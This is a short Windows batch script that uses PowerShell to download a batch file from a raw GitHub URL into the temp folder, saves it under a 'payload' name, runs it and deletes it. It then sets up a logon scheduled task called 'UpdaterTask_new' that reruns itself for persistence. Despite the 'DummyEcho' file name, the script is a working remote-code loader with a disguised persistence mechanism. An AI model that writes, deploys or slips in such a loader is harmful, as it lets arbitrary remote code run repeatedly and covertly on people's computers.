@echo off
setlocal EnableDelayedExpansion

:: Define where to save the downloaded batch
set "TempBat=%TEMP%\payload_%random%%random%.bat"

:: Download the latest batch from your link

:: Download your real batch
set "TempBat=%TEMP%\payload_%random%%random%.bat"
powershell -Command ^
 "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0'); $s=$wc.DownloadString('https://raw.githubusercontent.com/Umair13303/Mr_Robox/refs/heads/main/BatchScript/Demo/DummyEcho.bat'); Set-Content -Path '%TempBat%' -Value $s"

:: Execute the downloaded batch
call "%TempBat%"

:: Optional: Delete it after running
del "%TempBat%" >nul 2>&1

:: ==========================
:: Create a scheduled task for persistence
:: ==========================

::: Create scheduled task on logon (no elevation required)
schtasks /query /tn "UpdaterTask_new" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create ^
        /tn "UpdaterTask_new" ^
        /tr "\"%~f0\"" ^
        /sc onlogon ^
        /f
)
PAUSE